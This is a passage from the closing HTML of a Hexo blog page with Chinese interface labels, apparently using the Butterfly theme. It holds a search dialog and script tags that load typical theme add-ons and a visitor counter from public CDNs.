class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = false;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="false" data-text="富强,民主,文明,和谐,自由,平等,公正,法治,爱国,敬业,诚信,友善" data-fontsize="15px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>